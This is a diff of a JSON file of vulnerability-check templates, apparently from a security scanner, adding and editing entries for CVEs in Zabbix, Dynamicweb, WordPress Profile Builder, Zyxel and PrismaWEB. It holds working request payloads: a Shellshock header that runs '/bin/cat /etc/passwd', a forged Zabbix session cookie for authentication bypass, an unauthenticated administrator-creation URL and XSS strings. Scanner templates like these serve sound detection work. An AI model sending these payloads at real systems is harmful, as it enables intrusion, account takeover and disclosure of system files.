@@ -3277,9 +3277,9 @@
       "requests": [
         {
           "headers": {
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -7201,6 +7201,21 @@
       ]
     },
     {
+      "id": "CVE-2018-9161",
+      "info": {
+        "name": "PrismaWEB - Credentials Disclosure",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/user/scripts/login_par.js"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-9205",
       "info": {
         "name": "Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure",
@@ -8935,14 +8950,14 @@
     {
       "id": "CVE-2019-9955",
       "info": {
-        "name": "CVE-2019-9955 Zyxel XSS",
+        "name": "Zyxel Reflected Cross-site Scripting",
         "severity": "medium"
       },
       "requests": [
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/?mobile=1&mp_idx=%22;alert(%271%27);//"
+            "{{BaseURL}}/?mp_idx=%22;alert(%271%27);//"
           ]
         }
       ]
@@ -15612,6 +15627,35 @@
       ]
     },
     {
+      "id": "CVE-2022-0653",
+      "info": {
+        "name": "Wordpress Profile Builder Plugin XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/profile-builder/assets/misc/fallback-page.php?site_url=javascript:alert(document.domain);&message=Not+Found&site_name=404"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-23131",
+      "info": {
+        "name": "Zabbix - SAML SSO Authentication Bypass",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /index_sso.php HTTP/1.1\nHost: {{Hostname}}\nCookie: zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-23178",
       "info": {
         "name": "Crestron Device - Credentials Disclosure",
@@ -15682,6 +15726,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/admin.back<img%20src=x%20onerror=alert(document.domain)>"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-25369",
+      "info": {
+        "name": "Dynamicweb 9.5.0 - 9.12.7 Unauthenticated Admin addition",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/Admin/Access/Setup/Default.aspx?Action=createadministrator&adminusername={{rand_base(6)}}&adminpassword={{rand_base(6)}}&adminemail=test@test.com&adminname=test"
           ]
         }
       ]
